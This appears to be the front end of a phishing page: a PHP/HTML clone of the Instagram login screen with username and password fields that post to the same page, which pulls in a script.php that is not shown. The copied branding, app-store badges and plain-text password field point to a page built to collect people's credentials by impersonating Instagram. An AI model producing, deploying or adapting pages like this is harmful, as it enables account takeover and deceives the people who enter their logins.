<?php require("script.php")?>

<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="assets/css/main.css">
  <title>Instagram</title>
</head>
<body>
  
  <main class="l-main">
      <div class="l-main__img">
        <img src="assets/img/homepage.png" alt="Smartphones">
      </div>
      <form action="" method="post">
        <div class="l-user">

        <div class="c-panel group">
            <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">

          <div class="c-panel__form">
              <input type="text" class="c-panel__input" placeholder="Phone number, username, or email" name="username">
              <input type="text" class="c-panel__input" placeholder="Password" name="password">
              <input type="submit" value="Log In" class="c-btn" NAME="submit">
              <span class="c-panel__span">OR</span>
          </div>

      </form>

            <a href="#" class="c-panel__facebook">Login with Facebook</a>
            <a href="#" class="c-panel__forgot">Forgot password?</a>
        </div>

        <div class="c-signup group">
            <p>Don't have an account? <span>Sign up</span></p>
        </div>

        <div class="c-app">
            <p>Get the app.</p>

          <div class="c-app__download">
              <img src="assets/img/apple.png" alt="Apple Store">
              <img src="assets/img/google.png" alt="Google Play">
          </div>

        </div>

        </div>
      
      

  </main>
</body>
</html>